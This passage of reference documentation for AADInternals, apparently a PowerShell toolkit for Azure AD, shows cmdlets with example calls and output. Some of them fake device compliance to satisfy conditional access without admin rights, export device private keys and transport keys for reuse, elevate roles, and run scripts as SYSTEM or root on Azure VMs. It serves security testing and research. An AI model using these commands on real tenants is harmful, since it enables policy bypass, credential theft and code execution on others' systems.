Set-AADIntDeviceTransportKey -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7" -JsonFileName .\d03994c9-24f8-41ba-a156-1805998d6dc7-TKPUB.json
{{< /highlight>}}

**Example3:**
{{< highlight powershell >}}
# Change the transport key using pfx
Set-AADIntDeviceTransportKey -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7" -PfxFileName .\my_cert.pfx -PfxPassword "MyPassword"
{{< /highlight>}}

### Get-AADIntDeviceCompliance (A)
Since version 0.4.3 <br>
Gets the user's device compliance status using AAD Graph API. Does not require admin rights!

**Example1:**
{{< highlight powershell >}}
# Get access token 
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Get the device compliance
Get-AADIntDeviceCompliance -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7"
{{< /highlight>}}
**Output:**
```
displayName           : SixByFour
objectId              : 2eaa21a1-6362-4d3f-afc4-597592217ef0
deviceId              : d03994c9-24f8-41ba-a156-1805998d6dc7
isCompliant           : False
isManaged             : True
deviceOwnership       : Company
deviceManagementAppId : 0000000a-0000-0000-c000-000000000000
```

**Example2:**
{{< highlight powershell >}}
# Get the device compliance of owned devices
Get-AADIntDeviceCompliance -My | Format-Table
{{< /highlight>}}
**Output:**
```
displayName   objectId                             deviceId                             isCompliant isManaged deviceOwnership deviceManagementAppId 
-----------   --------                             --------                             ----------- --------- --------------- ---------------------
SixByFour     2eaa21a1-6362-4d3f-afc4-597592217ef0 d03994c9-24f8-41ba-a156-1805998d6dc7       False      True Company         0000000a-0000-0000-c000-000000000000
DESKTOP-X4LCS 8ba68233-4d2b-4331-8b8b-27bc53204d8b c9dcde64-5d0f-4b3c-b711-cb6947837dc2       False      True Company         0000000a-0000-0000-c000-000000000000
SM-1234       c00af9fe-108e-446b-aeee-bf06262973dc 74080692-fb38-4a7b-be25-27d9cbf95705                       Personal
```

### Set-AADIntDeviceCompliant (A)
Since version 0.4.3 <br>
Sets the user's device compliant using AAD Graph API. Does not require admin rights. <br>
Compliant and managed statuses can be used in conditional access (CA) rules.

**Example 1:**
{{< highlight powershell >}}
# Get access token 
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Set the device compliant
Set-AADIntDeviceCompliant -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7" -Managed
{{< /highlight>}}
**Output:**
```
displayName           : SixByFour
objectId              : 2eaa21a1-6362-4d3f-afc4-597592217ef0
deviceId              : d03994c9-24f8-41ba-a156-1805998d6dc7
isCompliant           : 
isManaged             : True
deviceOwnership       : Company
deviceManagementAppId : 0000000a-0000-0000-c000-000000000000
```

**Example 2:**
{{< highlight powershell >}}
# Get access token 
Get-AADIntAccessTokenForAADGraph -SaveToCache

# Set the device compliant
Set-AADIntDeviceCompliant -DeviceId "d03994c9-24f8-41ba-a156-1805998d6dc7" -Compliant
{{< /highlight>}}
**Output:**
```
displayName           : SixByFour
objectId              : 2eaa21a1-6362-4d3f-afc4-597592217ef0
deviceId              : d03994c9-24f8-41ba-a156-1805998d6dc7
isCompliant           : True
isManaged             : True
deviceOwnership       : Company
deviceManagementAppId : 0000000a-0000-0000-c000-000000000000
```

### Export-AADIntLocalDeviceCertificate
Since version 0.6.6 <br>
Exports the device certificate and private key of the local AAD joined/registered device.<br>
Certificate filename: &lt;deviceid>.pfx<br>


**Example:**
{{< highlight powershell >}}
# Export the device certificate
Export-AADIntLocalDeviceCertificate
{{< /highlight>}}
**Output:**
```
Certificate exported to   f72ad27e-5833-48d3-b1d6-00b89c429b91.pfx
```
### Export-AADIntLocalDeviceTransportKey
Since version 0.6.6 <br>
Exports the transport key of the local AAD joined/registered device. <br>
Filename:  &lt;deviceid>_tk.pem


**Example:**
{{< highlight powershell >}}
# Export the device transport keys
Export-AADIntLocalDeviceTransportKey
{{< /highlight>}}
**Output:**
```
Transport key exported to f72ad27e-5833-48d3-b1d6-00b89c429b91_tk.pem
```

### Join-AADIntLocalDeviceToAzureAD
Since version 0.6.6 <br>

Joins the local Windows device to Azure AD using the given certificate (and keys) created or exported earlier with AADInternals.

Creates required registry keys and values, saves transport key to SystemKeys, and starts related scheduled tasks.

**Example 1:**
{{< highlight powershell >}}
# Save access token to cache 
Get-AADIntAccessTokenForAADJoin -SaveToCache
# "Join" the device to Azure AD
Join-AADIntDeviceToAzureAD -DeviceName "My computer" -DeviceType "Commodore" -OSVersion "C64"
{{< /highlight>}}
```
Device successfully registered to Azure AD:
  DisplayName:     "My computer"
  DeviceId:        d03994c9-24f8-41ba-a156-1805998d6dc7
  Cert thumbprint: 78CC77315A100089CF794EE49670552485DE3689
  Cert file name : "d03994c9-24f8-41ba-a156-1805998d6dc7.pfx"
Local SID:
  S-1-5-32-544
Additional SIDs:
  S-1-12-1-797902961-1250002609-2090226073-616445738
  S-1-12-1-3408697635-1121971140-3092833713-2344201430
  S-1-12-1-2007802275-1256657308-2098244751-2635987013
```

{{< highlight powershell >}}
# Configure the local device to use the provided device certificate
Join-AADIntLocalDeviceToAzureAD -UserPrincipalName "JohnD@company.com" -PfxFileName .\f72ad27e-5833-48d3-b1d6-00b89c429b91.pfx
{{< /highlight>}}

**Output:**
```
Device configured. To confirm success, restart and run: dsregcmd /status
```

**Example 2:**
{{< highlight powershell >}}
# Export the device certificate
Export-AADIntLocalDeviceCertificate
{{< /highlight>}}
```
Certificate exported to   f72ad27e-5833-48d3-b1d6-00b89c429b91.pfx
```
{{< highlight powershell >}}
# Export transportkeys
Export-AADIntLocalDeviceTransportKey
{{< /highlight>}}
```
Transport key exported to f72ad27e-5833-48d3-b1d6-00b89c429b91_tk.pem
```
{{< highlight powershell >}}
# Configure the local device to use the provided device certificate and transport key
Join-AADIntLocalDeviceToAzureAD -UserPrincipalName "JohnD@company.com" -PfxFileName .\f72ad27e-5833-48d3-b1d6-00b89c429b91.pfx -TransportKeyFileName .\f72ad27e-5833-48d3-b1d6-00b89c429b91_tk.pem
{{< /highlight>}}

**Output:**
```
Device configured. To confirm success, restart and run: dsregcmd /status
```
## Client functions

### Get-AADIntOfficeUpdateBranch
Since version 0.2.4 <br>
This function shows the update branch (currently called channel) of the Office.

**Example:**
{{< highlight powershell >}}
# Get Office update branch
Get-AADIntOfficeUpdateBranch
{{< /highlight>}}

**Output:**
```
Update branch: Current
```

### Set-AADIntOfficeUpdateBranch
Since version 0.2.4 <br>
This function sets the update branch (currently called channel) of the Office.
Must run as administrator.

Branch | Channel | Notes
--- | --- | ---
InsiderFast | | Weekly builds, not generally supported
FirstReleaseCurrent || Preview of the current
Current | Monthly | Monthly updates
FirstReleaseDeferred | Semi-Annual (Targeted)| Preview of the deferred (March and September)
Deferred | Semi-Annual | Semi-annual updates (January and July)
DogFood | | Only for Microsoft employees

**Example:**
{{< highlight powershell >}}
# Get Office update branch
Set-AADIntOfficeUpdateBranch -UpdateBranch InsiderFast
{{< /highlight>}}

**Output:**
```
Update branch: InsiderFast
```

## Support and Recovery Assistant (SARA)

### Get-AADIntSARAUserInfo
Since version 0.2.4 <br>
This function gets user information using Microsoft Support and Recovery Assistant (SARA) API.
Can help in diagnostics and problem shooting. The analysis is run at MS diagnostic server and can take up to 30 seconds.

**Example:**
{{< highlight powershell >}}
# Get user information
$at=Get-AADIntAccessTokenForSARA
Get-AADIntSARAUserInfo -AccessToken $at
{{< /highlight>}}

**Output:**
```
Retrieving information..
Retrieving information..
Retrieving information..

AnalyzerName          : AnalysisRule, Microsoft.Online.CSE.HRC.Analysis.Analyzers.ExchangeCmdlets.GetUserAnalyzer, Microsoft.Online.CSE.HRC.Analysis.Analyzers.ExchangeCmdlets, Version=16.0.3144.0, Culture=
						neutral, PublicKeyToken=31bf3856ad364e35
AnalyzerDesc          : Attempting to get information about user "user@company.com".
StartTime             : 2019-07-08T12:29:40.4911399Z
Duration              : 00:00:51.1166849
CoreDuration          : 00:00:51.1166849
WaitingDuration       : 00:00:00
TotalChildrenDuration : 00:00:00
TotalWaitingDuration  : 00:00:00
ParentId              : 00000000-0000-0000-0000-000000000000
Value                 : true
ResultTitle           : Extracting information about Office 365 user is completed.
ResultTitleId         : Microsoft.Online.CSE.HRC.Analysis.Analyzers.ExchangeCmdlets.StringsGetUserComplete
UserMessage           : Successfully got the user information for "user@company.com".
UserMessageId         : Microsoft.Online.CSE.HRC.Analysis.Analyzers.ExchangeCmdlets.StringsGetUserSuccessDesc
AdminMessage          : 
SupportMessage        : 
IsMessageShown        : False
GenericInfo           : 
Severity              : 2
OverridesChildren     : False
ProblemId             : 00000000-0000-0000-0000-000000000000
TimeCached            : 0001-01-01T00:00:00
SaraSymptomId         : 00000000-0000-0000-0000-000000000000
SaraWorkflowRunId     : 00000000-0000-0000-0000-000000000000
SaraSymptomRunId      : 00000000-0000-0000-0000-000000000000
SaraSessionId         : 00000000-0000-0000-0000-000000000000
Id                    : d5b4c239-7619-4367-9ccb-e9fe2fe01e23

DisplayName               : Demo USer
FirstName                 : Demo
Guid                      : 67a93665-decb-4058-b42a-271d41c47c61
Id                        : 
Identity                  : EURP185A001.PROD.OUTLOOK.COM/Microsoft Exchange Hosted Organizations/demoo365life4.onmicrosoft.com/AdminO365life
IsDirSynced               : False
IsValid                   : True
LastName                  : User
MicrosoftOnlineServicesID : user@company.com
Name                      : DemoUser
NetID                     : 401320004BA7A415
RecipientType             : UserMailbox
RecipientTypeDetails      : UserMailbox
UserPrincipalName         : user@company.com
WindowsEmailAddress       : user@company.com
WindowsLiveID             : user@company.com
IsHybridTenant            : False
Forest                    : EURP185.PROD.OUTLOOK.COM
```

### Get-AADIntSARATenantInfo 
Since version 0.2.4 <br>
This function gets tenant information using Microsoft Support and Recovery Assistant (SARA) API.
Can help in diagnostics and problem shooting. The analysis is run at MS diagnostic server but should take only a second or two.

**Example:**
{{< highlight powershell >}}
# Get user information
$at=Get-AADIntAccessTokenForSARA
Get-AADIntSARATenantInfo -AccessToken $at
{{< /highlight>}}

**Output:**
```
Retrieving information..

AnalyzerName          : AnalysisRule, Microsoft.Online.CSE.HRC.Analysis.Analyzers.TenantInfo.TenantUserInfoAnalyzer, Microsoft.Online.CSE.HRC.Analysis.Analyzers.TenantInfo, Version=16.0.3144.0, Culture=neu
                        tral, PublicKeyToken=31bf3856ad364e35
AnalyzerDesc          : Checking your tenant and account information.
StartTime             : 2019-07-08T12:31:06.1602586Z
Duration              : 00:00:00.6250818
CoreDuration          : 00:00:00.6250818
WaitingDuration       : 00:00:00
TotalChildrenDuration : 00:00:00
TotalWaitingDuration  : 00:00:00
ParentId              : 00000000-0000-0000-0000-000000000000
Value                 : true
ResultTitle           : The licenses of your tenant and account are all good!
ResultTitleId         : Microsoft.Online.CSE.HRC.Analysis.Analyzers.TenantInfo.StringsGetTenantInfoSuccess
UserMessage           : 
UserMessageId         : 
AdminMessage          : 
SupportMessage        : <Setup><ProductId>O365ProPlusRetail</ProductId><ReleaseTrack>False</ReleaseTrack></Setup>
IsMessageShown        : False
GenericInfo           : User Puid is not null or empty.OrgIg_User<TenantUserInfo><IsLicensed>True</IsLicensed><ProvisioningStatus>PendingInput</ProvisioningStatus><PreferredLanguage>en</PreferredLanguage/>
						<ValidationStatus>Healthy</ValidationStatus><ReleaseTrack>Other</ReleaseTrack><LicenseInformations><LicenseInformation><SKUPartNumber>SPE_E5</SKUPartNumber><ServiceStatus><ServiceTy
						pe>Exchange</ServiceType><ServiceName>INFORMATION_BARRIERS</ServiceName><ProvisioningStatus>PendingProvisioning</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Micro
						softKaizala</ServiceType><ServiceName>KAIZALA_STANDALONE</ServiceName><ProvisioningStatus>PendingProvisioning</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Bing</S
						erviceType><ServiceName>MICROSOFT_SEARCH</ServiceName><ProvisioningStatus>PendingProvisioning</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Exchange</ServiceType><
						ServiceName>PREMIUM_ENCRYPTION</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>WhiteboardServices</ServiceType><ServiceName>
						WHITEBOARD_PLAN3</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Exchange</ServiceType><ServiceName>MIP_S_CLP2</ServiceName>
						<ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Exchange</ServiceType><ServiceName>MIP_S_CLP1</ServiceName><ProvisioningStatus>Success</P
						rovisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Exchange</ServiceType><ServiceName>MYANALYTICS_P2</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></Servic
						eStatus><ServiceStatus><ServiceType>Exchange</ServiceType><ServiceName>PAM_ENTERPRISE</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><Se
						rviceType>AzureAdvancedThreatAnalytics</ServiceType><ServiceName>ATA</ServiceName><ProvisioningStatus>Disabled</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>To-Do<
						/ServiceType><ServiceName>BPOS_S_TODO_3</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>ProcessSimple</ServiceType><ServiceN
						ame>FLOW_O365_P3</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>PowerAppsService</ServiceType><ServiceName>POWERAPPS_O365_P
						3</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>OfficeForms</ServiceType><ServiceName>FORMS_PLAN_E5</ServiceName><Provisio
						ningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Adallom</ServiceType><ServiceName>ADALLOM_S_STANDALONE</ServiceName><ProvisioningStatus>Disabled</
						ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>MicrosoftStream</ServiceType><ServiceName>STREAM_O365_E5</ServiceName><ProvisioningStatus>Success</ProvisioningStatus>
						</ServiceStatus><ServiceStatus><ServiceType>Deskless</ServiceType><ServiceName>Deskless</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><
						ServiceType>Exchange</ServiceType><ServiceName>THREAT_INTELLIGENCE</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Teamspace
						API</ServiceType><ServiceName>TEAMS1</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>WindowsDefenderATP</ServiceType><Servic
						eName>WINDEFATP</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Windows</ServiceType><ServiceName>WIN10_PRO_ENT_SUB</Service
						Name><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>RMSOnline</ServiceType><ServiceName>RMS_S_PREMIUM2</ServiceName><ProvisioningStatus>
						Disabled</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>AADPremiumService</ServiceType><ServiceName>AAD_PREMIUM_P2</ServiceName><ProvisioningStatus>Disabled</Provis
						ioningStatus></ServiceStatus><ServiceStatus><ServiceType>RMSOnline</ServiceType><ServiceName>RMS_S_PREMIUM</ServiceName><ProvisioningStatus>Disabled</ProvisioningStatus></ServiceSta
						tus><ServiceStatus><ServiceType>RMSOnline</ServiceType><ServiceName>RMS_S_ENTERPRISE</ServiceName><ProvisioningStatus>Disabled</ProvisioningStatus></ServiceStatus><ServiceStatus><Se
						rviceType>MultiFactorService</ServiceType><ServiceName>MFA_PREMIUM</ServiceName><ProvisioningStatus>Disabled</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>SCO</Ser
						viceType><ServiceName>INTUNE_A</ServiceName><ProvisioningStatus>Disabled</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>AADPremiumService</ServiceType><ServiceName>
						AAD_PREMIUM</ServiceName><ProvisioningStatus>Disabled</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>YammerEnterprise</ServiceType><ServiceName>YAMMER_ENTERPRISE</S
						erviceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Sway</ServiceType><ServiceName>SWAY</ServiceName><ProvisioningStatus>Success</
						ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>SharePoint</ServiceType><ServiceName>SHAREPOINTWAC</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></Serv
						iceStatus><ServiceStatus><ServiceType>SharePoint</ServiceType><ServiceName>SHAREPOINTENTERPRISE</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><Service
						Status><ServiceType>ProjectWorkManagement</ServiceType><ServiceName>PROJECTWORKMANAGEMENT</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus
						><ServiceType>MicrosoftOffice</ServiceType><ServiceName>OFFICESUBSCRIPTION</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>M
						icrosoftCommunicationsOnline</ServiceType><ServiceName>MCOSTANDARD</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Microsoft
						CommunicationsOnline</ServiceType><ServiceName>MCOMEETADV</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>MicrosoftCommunica
						tionsOnline</ServiceType><ServiceName>MCOEV</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Exchange</ServiceType><ServiceNa
						me>LOCKBOX_ENTERPRISE</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>SCO</ServiceType><ServiceName>INTUNE_O365</ServiceName
						><ProvisioningStatus>PendingActivation</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Exchange</ServiceType><ServiceName>EXCHANGE_S_ENTERPRISE</ServiceName><Provisi
						oningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Exchange</ServiceType><ServiceName>EXCHANGE_ANALYTICS</ServiceName><ProvisioningStatus>Success</P
						rovisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Exchange</ServiceType><ServiceName>EQUIVIO_ANALYTICS</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></Ser
						viceStatus><ServiceStatus><ServiceType>PowerBI</ServiceType><ServiceName>BI_AZURE_P2</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><Ser
						viceType>Exchange</ServiceType><ServiceName>ATP_ENTERPRISE</ServiceName><ProvisioningStatus>PendingProvisioning</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>Adall
						om</ServiceType><ServiceName>ADALLOM_S_O365</ServiceName><ProvisioningStatus>PendingInput</ProvisioningStatus></ServiceStatus></LicenseInformation><LicenseInformation><SKUPartNumber
						>EMSPREMIUM</SKUPartNumber><ServiceStatus><ServiceType>Exchange</ServiceType><ServiceName>EXCHANGE_S_FOUNDATION</ServiceName><ProvisioningStatus>PendingProvisioning</ProvisioningSta
						tus></ServiceStatus><ServiceStatus><ServiceType>AzureAdvancedThreatAnalytics</ServiceType><ServiceName>ATA</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStat
						us><ServiceStatus><ServiceType>Adallom</ServiceType><ServiceName>ADALLOM_S_STANDALONE</ServiceName><ProvisioningStatus>PendingInput</ProvisioningStatus></ServiceStatus><ServiceStatu
						s><ServiceType>RMSOnline</ServiceType><ServiceName>RMS_S_PREMIUM2</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>RMSOnline<
						/ServiceType><ServiceName>RMS_S_PREMIUM</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>RMSOnline</ServiceType><ServiceName>
						RMS_S_ENTERPRISE</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>SCO</ServiceType><ServiceName>INTUNE_A</ServiceName><Provis
						ioningStatus>PendingInput</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>AADPremiumService</ServiceType><ServiceName>AAD_PREMIUM_P2</ServiceName><ProvisioningStatus
						>Success</ProvisioningStatus></ServiceStatus><ServiceStatus><ServiceType>MultiFactorService</ServiceType><ServiceName>MFA_PREMIUM</ServiceName><ProvisioningStatus>Success</Provision
						ingStatus></ServiceStatus><ServiceStatus><ServiceType>AADPremiumService</ServiceType><ServiceName>AAD_PREMIUM</ServiceName><ProvisioningStatus>Success</ProvisioningStatus></ServiceS
						tatus></LicenseInformation></LicenseInformations></TenantUserInfo>
Severity              : 2
OverridesChildren     : False
ProblemId             : 00000000-0000-0000-0000-000000000000
TimeCached            : 0001-01-01T00:00:00
SaraSymptomId         : 00000000-0000-0000-0000-000000000000
SaraWorkflowRunId     : 00000000-0000-0000-0000-000000000000
SaraSymptomRunId      : 00000000-0000-0000-0000-000000000000
SaraSessionId         : 00000000-0000-0000-0000-000000000000
Id                    : 81157ffa-d946-4bf8-8d6e-a391b96e4bf6
```

## Azure functions

### Grant-AADIntAzureUserAccessAdminRole (AC)
Since version 0.3.3 <br>
Elevates the current authenticated Global Admin to Azure User Access Administrator.
This allows the admin for instance to manage all role assignments in all subscriptions of the tenant.

**Example:**
{{< highlight powershell >}}
# Get the Access Token
$at=Get-AADIntAccessTokenForAzureCoreManagement

# Grant Azure User Access Administrator role 
Grant-AADIntAzureUserAccessAdminRole -AccessToken $at
{{< /highlight>}}

### Get-AADIntAzureSubscriptions (AC)
Since version 0.3.3 <br>
Lists the tenant's Azure subscriptions

**Example:**
{{< highlight powershell >}}
# Get the Access Token
$at=Get-AADIntAccessTokenForAzureCoreManagement

# Get all subscriptions of the current tenant
Get-AADIntAzureSubscriptions -AccessToken $at
{{< /highlight>}}

**Output:**
```
subscriptionId                       displayName   state  
--------------                       -----------   -----  
867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 MyAzure001    Enabled
99fccfb9-ed41-4179-aaf5-93cae2151a77 Pay-as-you-go Enabled
```

### Set-AADIntAzureRoleAssignment (AC)
Since version 0.3.3 <br>
Assigns a given role to the given user. Defaults to the current user.

**Example:**
{{< highlight powershell >}}
# Get the Access Token
$at=Get-AADIntAccessTokenForAzureCoreManagement

# Grant Virtual Machine Contributor role to the current user
Set-AADIntAzureRoleAssignment -AccessToken $at -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 -RoleName "Virtual Machine Contributor"
{{< /highlight>}}

**Output:**
```
roleDefinitionId : /subscriptions/867ae413-0ad0-49bf-b4e4-6eb2db1c12a0/providers/Microsoft.Authorization/roleDefinitions/9980e02c-c2be-4d73-94e8-173b1dc7cf3c
principalId      : 90f9ca62-2238-455b-bb15-de695d689c12
principalType    : User
scope            : /subscriptions/867ae413-0ad0-49bf-b4e4-6eb2db1c12a0
createdOn        : 2020-06-03T11:29:58.1683714Z
updatedOn        : 2020-06-03T11:29:58.1683714Z
createdBy        : 
updatedBy        : 90f9ca62-2238-455b-bb15-de695d689c12
```

### Get-AADIntAzureClassicAdministrators (AC)
Since version 0.3.3 <br>
Returns classic administrators of the given Azure subscription

**Example:**
{{< highlight powershell >}}
# Get the Access Token
Get-AADIntAccessTokenForAzureCoreManagement -SaveToCache
Get-AADIntAzureClassicAdministrators -Subscription "4f9fe2bc-71b3-429f-8a63-5957f1582144"
{{< /highlight>}}

**Output:**
```
emailAddress                  role                                     
------------                  ----                                     
admin@company.onmicrosoft.com ServiceAdministrator;AccountAdministrator
co-admin@comapny.com          CoAdministrator
```

### Get-AADIntAzureResourceGroups (AC)
Since version 0.3.3 <br>
Lists Azure subscription ResourceGroups

**Example:**
{{< highlight powershell >}}
# Get the Access Token
$at=Get-AADIntAccessTokenForAzureCoreManagement

# List the Resource Groups
Get-AADIntAzureResourceGroups -AccessToken $at -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0
{{< /highlight>}}

**Output:**
```
name       location tags
----       -------- ----
Production westus   Production
Test       eastus   Test
```

### Get-AADIntAzureVMs (AC)
Since version 0.3.3 <br>
Lists Azure subscription Virtual Machines and shows the relevant information

**Example:**
{{< highlight powershell >}}
# Get the Access Token
$at=Get-AADIntAccessTokenForAzureCoreManagement

# List the VMs
Get-AADIntAzureVMs -AccessToken $at -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0
{{< /highlight>}}

**Output:**
```
resourceGroup name     location   id                                   computerName adminUserName vmSize          OS     
------------- ----     --------   --                                   ------------ ------------- ------          --     
PRODUCTION    Client   westus     c210d38b-3346-41d3-a23d-27988315825b Client       AdminUSer     Standard_A2_v2  Windows
PRODUCTION    DC       westus     9b8f8753-196f-4f24-847a-e5bcb751936d DC           AdminUSer     Standard_DS1_v2 Windows
PRODUCTION    Exchange westus     a12ffb24-a69e-4ce9-aff3-275f49bba315 Exchange     AdminUSer     Standard_DS2_v2 Windows
PRODUCTION    Server1  westus     c7d98db7-ccb5-491f-aaeb-e71f0df478b6 Server1      AdminUSer     Standard_DS1_v2 Windows
TEST          Server2  eastus     ae34dfcc-ad89-4e53-b0b4-20d453bdfcef Server2      AdminUSer     Standard_DS1_v2 Windows
TEST          Server3  eastus     f8f6a7c5-9927-47f9-a790-84c866f5719c Server3      AzureUser     Standard_B1ms   Linux
```

### Invoke-AADIntAzureVMScript (AC)
Since version 0.3.3 <br>
Runs a given script on the given Azure VM as a SYSTEM or root.

**Note!** Although the scripts supports UTF-8, the response only shows ascii characters so any UTF-8 character is shown incorrectly (bug at Microsoft's end).

Multi-line scripts are supported. Use `n as a line separator.

**Example1:**
{{< highlight powershell >}}
# Get the Access Token
$at=Get-AADIntAccessTokenForAzureCoreManagement

# Invoke "whoami" on Server2
Invoke-AADIntAzureVMScript -AccessToken $at -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 -ResourceGroup PRODUCTION -Server Server2 -Script "whoami"
{{< /highlight>}}

**Output1:**
```
[stdout]
nt authority\system

[stderr]
```

**Example2:**
{{< highlight powershell >}}
# Get the Access Token
$at=Get-AADIntAccessTokenForAzureCoreManagement

# Invoke "whoami" on Server3
Invoke-AADIntAzureVMScript -AccessToken $at -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 -ResourceGroup TEST -Server Server3 -Script "whoami" -VMType Linux
{{< /highlight>}}

**Output2:**
```
Enable succeeded: 
[stdout]
root

[stderr]
```

**Example3:**
{{< highlight powershell >}}
# Get the Access Token
$at=Get-AADIntAccessTokenForAzureCoreManagement

# Invoke multi-line script on Server2
Invoke-AADIntAzureVMScript -AccessToken $at -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 -ResourceGroup PRODUCTION -Server Server2 -Script "whoami`nGet-Process 123123123"
{{< /highlight>}}

**Output3:**
```
[stdout]
nt authority\system

[stderr]
Get-Process : Cannot find a process with the name "123123123". Verify the process name and call the cmdlet again.
At C:\Packages\Plugins\Microsoft.CPlat.Core.RunCommandWindows\1.1.5\Downloads\script42.ps1:2 char:1
+ Get-Process 123123123
+ ~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (123123123:String) [Get-Process], ProcessCommandException
    + FullyQualifiedErrorId : NoProcessFoundForGivenName,Microsoft.PowerShell.Commands.GetProcessCommand
```

**Example4:**
{{< highlight powershell >}}
# List running processes of Server2
Invoke-AADIntAzureVMScript -AccessToken $at -SubscriptionId 867ae413-0ad0-49bf-b4e4-6eb2db1c12a0 -ResourceGroup PRODUCTION -Server Server2 -Script "Get-Process"
{{< /highlight>}}

**Output4:**
```

[stdout]
    727      36    14132      27092       5.94    396   0 svchost                                                      
    936      29    69796      76820       7.91    400   0 svchost                                                      
    664      22    15664      27432      39.39    464   0 svchost                                                      
    839      23     6856      24352       0.91    792   0 svchost                                                      
    785      17     4792      10968       4.75    892   0 svchost                                                      
    282      13     3020       9324       7.41   1052   0 svchost                                                      
   1889      96    38548      72480      24.86   1216   0 svchost                                                      
    642      35     8928      28452       0.50   1236   0 svchost                                                      
    519      24    19480      37620       4.08   1376   0 svchost                                                      
    411      17    15440      18076      29.81   1392   0 svchost                                                      
    833      41    10676      25512       2.02   1424   0 svchost                                                      
    317      11     2000       8840       0.08   1432   0 svchost                                                      
    380      31     7324      16320       0.39   1584   0 svchost                                                      
    211      12     1876       7524       0.22   1808   0 svchost                                                      
    199       9     1596       6916       0.00   1968   0 svchost                                                      
    200      10     2308       8344       0.06   2188   0 svchost                                                      
    146       8     1472       7144       0.06   3000   0 svchost                                                      
    468      21     6516      31128       0.33   3140   2 svchost                                                      
    173       9     4332      12968       0.72   3208   0 svchost                                                      
   2061       0      192        156      11.45      4   0 System                                                       
    340      17     3964      17324       0.13   3416   2 TabTip                                                       
    413      24    13016      34008       0.25   4488   2 TabTip                                                       
    103       7     1264       4756       0.00   3264   2 TabTip32                                                     
    216      22     4864      14260       0.08   1272   2 taskhostw                                                    
    446      24    17080      22096       0.39   2796   0 taskhostw                                                    
    150       9     1664       8984       0.03   1196   0 VSSVC                                                        
    946      45    62896      78976      13.22   2068   0 WaAppAgent                                                   
    119       6     1504       5800       0.02   4152   0 WaSecAgentProv                                               
    646      41    45220      68180      85.78   2088   0 WindowsAzureGuestAgent                                       
    131       9     2252       8344       0.03   3868   0 WindowsAzureNetAgent                                         
    174      11     1548       6916       0.11    552   0 wininit                                                      
    234      11     2588      11160       0.09    612   1 winlogon                                                     
    266      12     2456      10120       0.08   3428   2 winlogon                                                     
